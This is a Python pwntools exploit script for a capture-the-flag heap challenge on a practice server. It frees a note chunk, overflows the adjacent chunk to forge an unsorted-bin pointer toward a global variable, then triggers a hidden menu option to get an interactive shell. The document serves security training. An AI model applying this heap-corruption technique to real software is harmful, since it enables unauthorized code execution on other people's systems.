from pwn import *
context.binary = './pwn14'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20001)
	libc = ELF('./libc.so.6')
else:
	libc = context.binary.libc
	p = process('./pwn14')

def dbg():
	raw_input()

def create(content):
	size = len(content)
	p.recvuntil('Your choice : ')
	p.sendline('1')
	p.recvuntil('Size of note : ')
	p.sendline(str(size))
	p.recvuntil('Content of note:')
	p.send(content)

	print "create a chunk success"

def edit(idx, content):
	size = len(content)
	p.recvuntil('Your choice : ')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(idx))
	p.recvuntil('Size of note : ')
	p.sendline(str(size))
	p.recvuntil('Content of note : ')
	p.send(content)

def free(idx):
	p.recvuntil('Your choice : ')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(idx))
	print "free chunk %d success " % idx

create('a'*0x80)
create('b'*0x80)
create('c'*0x80)

free(1)


target_addr = 0x4040A0 - 0x10
edit(0, 'a'*0x80 + p64(0x90) + p64(0x91) + p64(0xdeadbeef) + p64(target_addr))

create('v'*0x80)

p.recvuntil('Your choice : ')
p.sendline('70')

p.interactive()
p.close()


